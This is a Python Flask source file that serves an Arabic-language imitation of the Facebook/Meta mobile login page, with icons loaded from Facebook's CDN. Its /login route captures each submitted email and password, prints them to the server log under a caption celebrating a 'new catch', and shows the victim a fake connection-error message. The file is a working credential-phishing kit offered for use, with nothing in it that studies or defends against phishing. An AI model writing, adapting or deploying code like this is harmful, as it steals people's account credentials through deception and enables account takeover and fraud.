from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

# هذا الكود يجمع بين الشكل الجديد والخدمة المضمونة
HTML_CODE = """
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تسجيل الدخول</title>
    <style>
        body { font-family: sans-serif; background: #000; color: white; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; flex-direction: column; }
        
        .top-container { width: 100%; text-align: right; padding: 15px; box-sizing: border-box; }
        .back-arrow { font-size: 24px; color: white; float: right; }
        .lang { color: #888; margin-right: 15px; font-size: 14px; display: inline-block; vertical-align: top; }
        .lang-icon { width: 20px; vertical-align: middle; margin-right: 5px; opacity: 0.6; }

        .login-box { width: 90%; max-width: 400px; display: flex; flex-direction: column; align-items: center; margin-top: 20px; }
        .show-all-photos { background: #333; color: white; padding: 10px 20px; border-radius: 20px; font-size: 14px; margin-bottom: 20px; border: none; cursor: pointer; text-align: center; }

        .form-container { width: 100%; display: flex; flex-direction: column; align-items: center; border-radius: 12px; }
        .input-group { width: 100%; position: relative; margin-bottom: 12px; border: 1px solid #444; border-radius: 8px; background: transparent; padding: 10px; display: flex; align-items: center; }
        input { width: 90%; background: transparent; border: none; color: white; font-size: 16px; outline: none; margin-right: 10px; }
        input::placeholder { color: #888; font-size: 14px; }
        .info-icon { width: 18px; position: absolute; left: 10px; opacity: 0.6; }

        .btn-blue { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 25px; cursor: pointer; font-size: 16px; font-weight: bold; margin-bottom: 15px; margin-top: 10px; text-align: center; display: inline-block; }
        .btn-outline { width: 100%; padding: 10px; background: transparent; color: #1877f2; border: 1px solid #1877f2; border-radius: 25px; cursor: pointer; font-size: 16px; font-weight: bold; margin-bottom: 15px; text-align: center; display: inline-block; text-decoration: none; }
        .forgot-pass { color: #888; font-size: 14px; text-decoration: none; margin-top: 10px; display: block; }
        
        .footer { width: 100%; text-align: center; color: #888; font-size: 16px; position: absolute; bottom: 20px; left: 0; }
        .footer-logo { width: 25px; vertical-align: middle; margin-left: 5px; opacity: 0.6; }
    </style>
</head>
<body>
    <div class="top-container">
        <span class="back-arrow">&#8594;</span>
        <span class="lang">العربية <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yV/r/N7h-r7_l_tB.png" class="lang-icon"></span>
    </div>

    <div class="login-box">
        <button class="show-all-photos">عرض كل الصور</button>
        
        <form class="form-container" action="/login" method="post">
            <div class="input-group">
                <input type="text" name="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yN/r/3u3R4mX6u-Y.png" class="info-icon">
            </div>
            
            <div class="input-group">
                <input type="password" name="password" placeholder="كلمة السر" required>
            </div>
            
            <button type="submit" class="btn-blue">تسجيل الدخول</button>
            <a href="#" class="forgot-pass">هل نسيت كلمة السر؟</a>
        </form>
    </div>

    <a href="#" class="btn-outline" style="position: absolute; bottom: 80px; left: 50%; transform: translateX(-50%); width: 85%;">إنشاء حساب جديد</a>
    
    <div class="footer">
        <span>Meta</span> <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yC/r/9nJ5YpQ5iN6.png" class="footer-logo">
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_CODE)

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    # هذا هو الصح اللي راح تشوفو في السجلات
    print(f"\n🎯 صيدة جديدة جمرة:\n📧 الإيميل: {email}\n🔑 المودباس: {password}\n")
    return "خطأ في الاتصال، حاول لاحقاً"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
